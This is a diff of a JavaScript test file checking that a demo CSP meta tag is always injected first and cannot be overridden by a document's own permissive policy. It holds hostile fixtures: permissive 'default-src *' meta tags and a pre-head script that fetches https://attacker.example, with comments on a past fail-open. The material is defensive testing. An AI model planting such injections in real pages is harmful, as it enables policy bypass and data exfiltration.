@@ -57,10 +57,35 @@ describe("demo document policy", () => {
 		assert.match(fragment, /<div>fragment demo<\/div>/);
 	});
 
-	it("is idempotent, so verification then render cannot stack duplicates", () => {
-		const once = withDemoCSP("<!doctype html><html><head></head><body>x</body></html>");
-		assert.equal(withDemoCSP(once), once);
-		assert.equal(once.match(/Content-Security-Policy/g)?.length, 1);
+	it("never lets the document opt out by supplying a CSP of its own", () => {
+		// The fail-open this replaced: an earlier version returned the
+		// document untouched when it already mentioned a CSP, so an injected
+		// brief could have the builder emit `default-src *` and skip the
+		// policy on BOTH paths. Policies intersect, so a document-supplied
+		// one can only tighten — ours just has to always be there, and first.
+		for (const own of [
+			'<meta http-equiv="Content-Security-Policy" content="default-src *">',
+			"<meta http-equiv='Content-Security-Policy' content='default-src *'>",
+			"<meta http-equiv=Content-Security-Policy content=\"default-src *\">",
+		]) {
+			const out = withDemoCSP(`<!doctype html><html><head>${own}<title>t</title></head><body>x</body></html>`);
+			assert.ok(out.includes(DEMO_CSP), `policy applied despite: ${own}`);
+			assert.ok(out.indexOf(DEMO_CSP) < out.indexOf("default-src *"), "ours is delivered first");
+		}
+	});
+
+	it("precedes content the parser hoists into the head", () => {
+		// A <script> written before <head> is hoisted into that same head.
+		// Inserting the meta after <head> put it BEHIND such a script, which
+		// then ran unrestricted — confirmed leaking in Chrome before the fix.
+		const out = withDemoCSP('<!doctype html><script>fetch("https://attacker.example")</script><html><head></head><body>x</body></html>');
+		assert.ok(out.indexOf("Content-Security-Policy") < out.indexOf("<script>"), "policy precedes a pre-head script");
+	});
+
+	it("keeps the doctype first even with leading whitespace or odd casing", () => {
+		const out = withDemoCSP("\n  <!DOCTYPE HTML><html><head></head><body>x</body></html>");
+		assert.match(out, /^\s*<!DOCTYPE HTML>/);
+		assert.ok(out.indexOf("Content-Security-Policy") < out.indexOf("<html>"));
 	});
 
 	it("applies to the learner's iframe too, alongside the bridge script", () => {
